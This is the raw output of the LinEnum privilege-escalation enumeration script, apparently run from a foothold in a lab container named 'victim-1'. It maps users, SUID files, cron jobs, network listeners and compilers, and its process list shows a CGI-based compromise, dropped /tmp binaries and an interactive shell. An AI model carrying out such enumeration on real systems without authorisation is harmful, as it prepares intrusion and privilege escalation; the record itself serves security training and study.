# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sun Jun 18 02:55:39 UTC 2023


### SYSTEM ##############################################
[-] Kernel information:
Linux victim-1 5.4.0-137-generic #154-Ubuntu SMP Thu Jan 5 17:03:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 5.4.0-137-generic (buildd@lcy02-amd64-009) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #154-Ubuntu SMP Thu Jan 5 17:03:22 UTC 2023


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.6 LTS"
NAME="Ubuntu"
VERSION="14.04.6 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.6 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"


[-] Hostname:
victim-1


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1(daemon) gid=1(daemon) groups=1(daemon)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest


[-] Who else is logged on:
 02:55:39 up 130 days,  9:41,  0 users,  load average: 0.11, 0.11, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)


[-] It looks like we have some admin users:
uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 8.0K
drwxr-xr-x 2 root root 4.0K Apr 10  2014 .
drwxr-xr-x 1 root root 4.0K Jun 18 01:59 ..


### ENVIRONMENTAL #######################################
[-] Environment information:
USER=daemon
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
PWD=/tmp
LANG=C
HOME=/usr/sbin
SHLVL=2
_=/usr/bin/env


ls: cannot access /system/bin: No such file or directory
ls: cannot access /system/sbin: No such file or directory
ls: cannot access /system/xbin: No such file or directory
[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
drwxr-xr-x 2 root root 4096 Dec 17  2019 /bin
drwxr-xr-x 1 root root 4096 Dec 19  2019 /sbin
drwxr-xr-x 1 root root 4096 Jun 16  2020 /usr/bin
drwxr-xr-x 2 root root 4096 Apr 10  2014 /usr/games
drwxr-xr-x 2 root root 4096 Dec 17  2019 /usr/local/bin
drwxr-xr-x 2 root root 4096 Dec 17  2019 /usr/local/games
drwxr-xr-x 2 root root 4096 Dec 17  2019 /usr/local/sbin
drwxr-xr-x 1 root root 4096 Dec 19  2019 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Feb  9  2013 /etc/crontab

/etc/cron.d:
total 12
drwxr-xr-x 2 root root 4096 Dec 17  2019 .
drwxr-xr-x 1 root root 4096 Jun 18 01:59 ..
-rw-r--r-- 1 root root  102 Feb  9  2013 .placeholder

/etc/cron.daily:
total 44
drwxr-xr-x 2 root root  4096 Dec 17  2019 .
drwxr-xr-x 1 root root  4096 Jun 18 01:59 ..
-rw-r--r-- 1 root root   102 Feb  9  2013 .placeholder
-rwxr-xr-x 1 root root 15481 Apr 10  2014 apt
-rwxr-xr-x 1 root root   256 Mar  7  2014 dpkg
-rwxr-xr-x 1 root root   372 Aug 10  2017 logrotate
-rwxr-xr-x 1 root root   249 Feb 17  2014 passwd
-rwxr-xr-x 1 root root   328 Jul 18  2014 upstart

/etc/cron.hourly:
total 12
drwxr-xr-x 2 root root 4096 Dec 17  2019 .
drwxr-xr-x 1 root root 4096 Jun 18 01:59 ..
-rw-r--r-- 1 root root  102 Feb  9  2013 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x 2 root root 4096 Dec 17  2019 .
drwxr-xr-x 1 root root 4096 Jun 18 01:59 ..
-rw-r--r-- 1 root root  102 Feb  9  2013 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x 2 root root 4096 Dec 17  2019 .
drwxr-xr-x 1 root root 4096 Jun 18 01:59 ..
-rw-r--r-- 1 root root  102 Feb  9  2013 .placeholder
-rwxr-xr-x 1 root root  427 Apr 16  2014 fstrim


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 02:42:c0:6a:47:03  
          inet addr:192.106.71.3  Bcast:192.106.71.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:973 errors:0 dropped:0 overruns:0 frame:0
          TX packets:656 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:2132990 (2.1 MB)  TX bytes:216493 (216.4 KB)

ip_vti0   Link encap:IPIP Tunnel  HWaddr   
          NOARP  MTU:1480  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:164 (164.0 B)  TX bytes:164 (164.0 B)


[-] ARP history:
n0uiwvvuwsulrfopybaxwidkm.temp-network_a-106-71 (192.106.71.2) at 02:42:c0:6a:47:02 [ether] on eth0


[-] Nameserver(s):
nameserver 127.0.0.11


[-] Default route:
default         linux           0.0.0.0         UG    0      0        0 eth0


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.11:36267        0.0.0.0:*               LISTEN      -               


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 127.0.0.11:35663        0.0.0.0:*                           -               


### SERVICES #############################################
[-] Running processes:
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  52132 16712 ?        Ss   01:59   0:00 /usr/bin/python /usr/bin/supervisord -n
root          10  0.0  0.0  17968  2852 ?        S    01:59   0:00 /bin/bash /root/startup.sh
daemon        11  0.0  0.0 431988  5120 ?        Sl   01:59   0:00 /opt/apache/bin/httpd -X
daemon        12  0.0  0.0  76916  3112 ?        S    01:59   0:00 /opt/apache/bin/httpd -X
daemon        45  0.0  0.0   7304  2284 ?        S    02:04   0:00 /usr/local/bash-4.3.0/bin/bash /opt/apache/htdocs/gettime.cgi
daemon        46  0.0  0.0   7312  2000 ?        S    02:04   0:00 /usr/local/bash-4.3.0/bin/bash /opt/apache/htdocs/gettime.cgi
daemon        47  0.0  0.0   1216  1044 ?        S    02:04   0:00 /tmp/PbcRH
daemon        60  0.0  0.0   7304  2176 ?        S    02:25   0:00 /usr/local/bash-4.3.0/bin/bash /opt/apache/htdocs/gettime.cgi
daemon        61  0.0  0.0   7312  1840 ?        S    02:25   0:00 /usr/local/bash-4.3.0/bin/bash /opt/apache/htdocs/gettime.cgi
daemon        62  0.0  0.0   1376  1204 ?        Sl   02:25   0:00 /tmp/LVVjh
daemon       184  0.0  0.0   4452   684 ?        S    02:53   0:00 /bin/sh
daemon       185  0.0  0.0  18148  3340 ?        S    02:54   0:00 /bin/bash -i
daemon       192  0.0  0.0  18964  4016 ?        S    02:55   0:00 /bin/bash ./linenum.sh
daemon       193  0.1  0.0  18992  3488 ?        S    02:55   0:00 /bin/bash ./linenum.sh
daemon       194  0.0  0.0   4356   656 ?        S    02:55   0:00 tee -a
daemon       356  0.0  0.0  18992  3008 ?        S    02:55   0:00 /bin/bash ./linenum.sh
daemon       357  0.0  0.0  15576  2100 ?        R    02:55   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root   root   1021112 May 16  2017 /bin/bash
lrwxrwxrwx 1 root   root         4 Feb 19  2014 /bin/sh -> dash
-rwxr-xr-x 1 root   root    852723 Jun 16  2020 /opt/apache/bin/httpd
-rwxrwxrwx 1 daemon daemon     207 Jun 18 02:25 /tmp/LVVjh
-rwxrwxrwx 1 daemon daemon     207 Jun 18 02:04 /tmp/PbcRH
lrwxrwxrwx 1 root   root         9 Dec 21  2013 /usr/bin/python -> python2.7
-rwxr-xr-x 1 root   root   3891806 Jun 16  2020 /usr/local/bash-4.3.0/bin/bash


[-] /etc/init.d/ binary permissions:
total 124
drwxr-xr-x 1 root root 4096 Jun 16  2020 .
drwxr-xr-x 1 root root 4096 Jun 18 01:59 ..
-rw-r--r-- 1 root root    0 Dec 17  2019 .legacy-bootordering
-rw-r--r-- 1 root root 2427 Mar 13  2014 README
-rwxr-xr-x 1 root root 1919 Jan 18  2011 console-setup
lrwxrwxrwx 1 root root   21 Feb  9  2013 cron -> /lib/init/upstart-job
-rwxr-xr-x 1 root root 1329 Mar 13  2014 halt
-rwxr-xr-x 1 root root 1293 Mar 13  2014 killprocs
-rwxr-xr-x 1 root root 1990 Jan 22  2013 kmod
-rwxr-xr-x 1 root root 4479 Mar 20  2014 networking
-rwxr-xr-x 1 root root 1581 Feb 17  2016 ondemand
-rwxr-xr-x 1 root root 1192 May 27  2013 procps
-rwxr-xr-x 1 root root 6120 Mar 13  2014 rc
-rwxr-xr-x 1 root root  782 Mar 13  2014 rc.local
-rwxr-xr-x 1 root root  117 Mar 13  2014 rcS
-rwxr-xr-x 1 root root  639 Mar 13  2014 reboot
-rwxr-xr-x 1 root root 2918 Nov 29  2017 resolvconf
-rwxr-xr-x 1 root root 2913 Dec  4  2013 rsyslog
-rwxr-xr-x 1 root root 3920 Mar 13  2014 sendsigs
-rwxr-xr-x 1 root root  590 Mar 13  2014 single
-rw-r--r-- 1 root root 4290 Mar 13  2014 skeleton
-rwxr-xr-x 1 root root  731 Feb  5  2014 sudo
-rwxr-xr-x 1 root root 4491 Jul 29  2013 supervisor
-rwxr-xr-x 1 root root 6173 Apr 14  2014 udev
-rwxr-xr-x 1 root root 2721 Mar 13  2014 umountfs
-rwxr-xr-x 1 root root 2260 Mar 13  2014 umountnfs.sh
-rwxr-xr-x 1 root root 1872 Mar 13  2014 umountroot
-rwxr-xr-x 1 root root 3111 Mar 13  2014 urandom


[-] /etc/init/ config file permissions:
total 296
drwxr-xr-x 2 root root 4096 Dec 17  2019 .
drwxr-xr-x 1 root root 4096 Jun 18 01:59 ..
-rw-r--r-- 1 root root  328 Feb 22  2014 bootmisc.sh.conf
-rw-r--r-- 1 root root  232 Feb 22  2014 checkfs.sh.conf
-rw-r--r-- 1 root root  253 Feb 22  2014 checkroot-bootclean.sh.conf
-rw-r--r-- 1 root root  307 Feb 22  2014 checkroot.sh.conf
-rw-r--r-- 1 root root  250 Oct  9  2012 console-font.conf
-rw-r--r-- 1 root root  509 Dec 21  2010 console-setup.conf
-rw-r--r-- 1 root root  266 Apr 11  2014 console.conf
-rw-r--r-- 1 root root 1122 Apr 11  2014 container-detect.conf
-rw-r--r-- 1 root root  356 Apr 11  2014 control-alt-delete.conf
-rw-r--r-- 1 root root  297 Feb  9  2013 cron.conf
-rw-r--r-- 1 root root  273 Nov 19  2010 dmesg.conf
-rw-r--r-- 1 root root 1377 Apr 11  2014 failsafe.conf
-rw-r--r-- 1 root root  267 Apr 11  2014 flush-early-job-log.conf
-rw-r--r-- 1 root root  284 Jul 23  2013 hostname.conf
-rw-r--r-- 1 root root  444 Apr 16  2014 hwclock-save.conf
-rw-r--r-- 1 root root  557 Apr 16  2014 hwclock.conf
-rw-r--r-- 1 root root  689 Apr 10  2014 kmod.conf
-rw-r--r-- 1 root root  268 Feb 22  2014 mountall-bootclean.sh.conf
-rw-r--r-- 1 root root  349 Feb 22  2014 mountall-net.conf
-rw-r--r-- 1 root root  261 Feb 22  2014 mountall-reboot.conf
-rw-r--r-- 1 root root 1201 Feb 22  2014 mountall-shell.conf
-rw-r--r-- 1 root root 1232 Feb 22  2014 mountall.conf
-rw-r--r-- 1 root root  311 Feb 22  2014 mountall.sh.conf
-rw-r--r-- 1 root root  327 Feb 22  2014 mountdevsubfs.sh.conf
-rw-r--r-- 1 root root  405 Feb 22  2014 mounted-debugfs.conf
-rw-r--r-- 1 root root  730 Feb 22  2014 mounted-dev.conf
-rw-r--r-- 1 root root  480 Feb 22  2014 mounted-proc.conf
-rw-r--r-- 1 root root  618 Feb 22  2014 mounted-run.conf
-rw-r--r-- 1 root root 1890 Feb 22  2014 mounted-tmp.conf
-rw-r--r-- 1 root root  903 Feb 22  2014 mounted-var.conf
-rw-r--r-- 1 root root  323 Feb 22  2014 mountkernfs.sh.conf
-rw-r--r-- 1 root root  249 Feb 22  2014 mountnfs-bootclean.sh.conf
-rw-r--r-- 1 root root  313 Feb 22  2014 mountnfs.sh.conf
-rw-r--r-- 1 root root  238 Feb 22  2014 mtab.sh.conf
-rw-r--r-- 1 root root  530 Mar 20  2014 network-interface-container.conf
-rw-r--r-- 1 root root 1756 May  4  2013 network-interface-security.conf
-rw-r--r-- 1 root root 1109 May  8  2014 network-interface.conf
-rw-r--r-- 1 root root 2493 Mar 20  2014 networking.conf
-rw-r--r-- 1 root root  534 Feb 17  2014 passwd.conf
-rw-r--r-- 1 root root  326 Mar 13  2014 plymouth-log.conf
-rw-r--r-- 1 root root  675 Mar 13  2014 plymouth-ready.conf
-rw-r--r-- 1 root root  778 Mar 13  2014 plymouth-shutdown.conf
-rw-r--r-- 1 root root  899 Mar 13  2014 plymouth-splash.conf
-rw-r--r-- 1 root root  796 Mar 13  2014 plymouth-stop.conf
-rw-r--r-- 1 root root  421 Apr 11  2014 plymouth-upstart-bridge.conf
-rw-r--r-- 1 root root  519 Mar 13  2014 plymouth.conf
-rw-r--r-- 1 root root  363 Jan  6  2014 procps.conf
-rw-r--r-- 1 root root 1543 Apr 11  2014 rc-sysinit.conf
-rw-r--r-- 1 root root  661 Apr 11  2014 rc.conf
-rw-r--r-- 1 root root  683 Apr 11  2014 rcS.conf
-rw-r--r-- 1 root root  457 Nov 29  2017 resolvconf.conf
-rw-r--r-- 1 root root  426 Apr 18  2013 rsyslog.conf
-rw-r--r-- 1 root root  230 Mar 18  2011 setvtrgb.conf
-rw-r--r-- 1 root root  277 Apr 11  2014 shutdown.conf
-rw-r--r-- 1 root root  711 Mar 13  2014 startpar-bridge.conf
-rw-r--r-- 1 root root  348 Apr 11  2014 tty1.conf
-rw-r--r-- 1 root root  333 Apr 11  2014 tty2.conf
-rw-r--r-- 1 root root  333 Apr 11  2014 tty3.conf
-rw-r--r-- 1 root root  333 Apr 11  2014 tty4.conf
-rw-r--r-- 1 root root  232 Apr 11  2014 tty5.conf
-rw-r--r-- 1 root root  232 Apr 11  2014 tty6.conf
-rw-r--r-- 1 root root  645 Jan  5  2017 udev-fallback-graphics.conf
-rw-r--r-- 1 root root  768 Apr 14  2014 udev-finish.conf
-rw-r--r-- 1 root root  337 Apr 14  2014 udev.conf
-rw-r--r-- 1 root root  356 Apr 14  2014 udevmonitor.conf
-rw-r--r-- 1 root root  352 Apr 14  2014 udevtrigger.conf
-rw-r--r-- 1 root root  412 Apr 11  2014 upstart-file-bridge.conf
-rw-r--r-- 1 root root  329 Apr 11  2014 upstart-socket-bridge.conf
-rw-r--r-- 1 root root  553 Apr 11  2014 upstart-udev-bridge.conf
-rw-r--r-- 1 root root  683 Mar 25  2013 ureadahead-other.conf
-rw-r--r-- 1 root root  889 Mar 25  2013 ureadahead.conf
-rw-r--r-- 1 root root 1521 Apr 11  2014 wait-for-state.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 240K
drwxr-xr-x 4 root root 4.0K Dec 17  2019 system
-rwxr-xr-x 1 root root 235K Apr  3  2019 systemd-udevd

/lib/systemd/system:
total 36K
drwxr-xr-x 2 root root 4.0K Dec 17  2019 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Dec 17  2019 sysinit.target.wants
lrwxrwxrwx 1 root root   21 Apr  3  2019 udev.service -> systemd-udevd.service
-rw-r--r-- 1 root root  823 Apr  3  2019 systemd-udev-settle.service
-rw-r--r-- 1 root root  715 Apr  3  2019 systemd-udev-trigger.service
-rw-r--r-- 1 root root  578 Apr  3  2019 systemd-udevd-control.socket
-rw-r--r-- 1 root root  575 Apr  3  2019 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  788 Apr  3  2019 systemd-udevd.service
-rw-r--r-- 1 root root  199 Jul 19  2017 rsyslog.service
-rw-r--r-- 1 root root  272 Feb  5  2014 sudo.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Apr  3  2019 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Apr  3  2019 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Apr  3  2019 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Apr  3  2019 systemd-udevd.service -> ../systemd-udevd.service


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.9p5


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/gcc


[-] Installed compilers:
ii  gcc                             4:4.8.2-1ubuntu6                           amd64        GNU C compiler
ii  gcc-4.8                         4.8.4-2ubuntu1~14.04.4                     amd64        GNU C compiler


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 956 Dec 17  2019 /etc/passwd
-rw-r--r-- 1 root root 510 Dec 17  2019 /etc/group
-rw-r--r-- 1 root root 665 Feb 20  2014 /etc/profile
-rw-r----- 1 root shadow 532 Dec 17  2019 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 69120 Nov 23  2016 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 36936 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 94792 Nov 23  2016 /bin/mount
-rwsr-xr-x 1 root root 10240 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 155008 May 29  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 46424 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 72280 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36592 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 47032 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 41336 May 16  2017 /usr/bin/chsh


[-] SGID files:
-rwxr-sr-x 1 root shadow 23360 May 16  2017 /usr/bin/expiry
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
-rwxr-sr-x 1 root shadow 55000 May 16  2017 /usr/bin/chage
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
-rwxr-sr-x 1 root tty 19024 Nov 23  2016 /usr/bin/wall
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
-rwxr-sr-x 1 root crontab 35984 Feb  9  2013 /usr/bin/crontab
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 35536 Mar 16  2016 /sbin/unix_chkpwd


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 2084 Apr  1  2013 /etc/sysctl.conf
-rw-r--r-- 1 root root 191 Dec  4  2013 /etc/libaudit.conf
-rw-r--r-- 1 root root 1260 Jul  1  2013 /etc/ucf.conf
-rw-r--r-- 1 root root 604 Nov  7  2013 /etc/deluser.conf
-rw-r--r-- 1 root root 92 Feb 20  2014 /etc/host.conf
-rw-r--r-- 1 root root 79 Jun 18 01:59 /etc/resolv.conf
-rw-r--r-- 1 root root 2969 Feb 23  2014 /etc/debconf.conf
-rw-r--r-- 1 root root 956 Feb 19  2014 /etc/mke2fs.conf
-rw-r--r-- 1 root root 703 Mar 22  2017 /etc/logrotate.conf
-rw-r--r-- 1 root root 34 Dec 17  2019 /etc/ld.so.conf
-rw-r--r-- 1 root root 2981 Dec 17  2019 /etc/adduser.conf
-rw-r--r-- 1 root root 321 Apr 16  2014 /etc/blkid.conf
-rw-r--r-- 1 root root 1320 Aug 19  2014 /etc/rsyslog.conf
-rw-r--r-- 1 root root 6488 Dec 17  2019 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 552 Jan 31  2014 /etc/pam.conf
-rw-r--r-- 1 root root 2584 Oct 10  2012 /etc/gai.conf
-rw-r--r-- 1 root root 771 May 18  2013 /etc/insserv.conf
-rw-r--r-- 1 root root 475 Feb 20  2014 /etc/nsswitch.conf


[-] Any interesting mail in /var/mail:
total 12
drwxrwsr-x 2 root mail 4096 Dec 17  2019 .
drwxr-xr-x 1 root root 4096 Dec 17  2019 ..


[+] Looks like we're in a Docker container:
12:memory:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
11:pids:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
10:blkio:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
9:freezer:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
8:cpuset:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
7:net_cls,net_prio:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
6:devices:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
5:cpu,cpuacct:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
4:rdma:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
3:perf_event:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
2:hugetlb:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
1:name=systemd:/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
0::/docker/6f7d9421139b6375e68dd54163e160736505c1a2607e5349b2b0cfec5e09c95d
-rwxr-xr-x 1 root root 0 Jun 18 01:59 /.dockerenv


### SCAN COMPLETE ####################################
```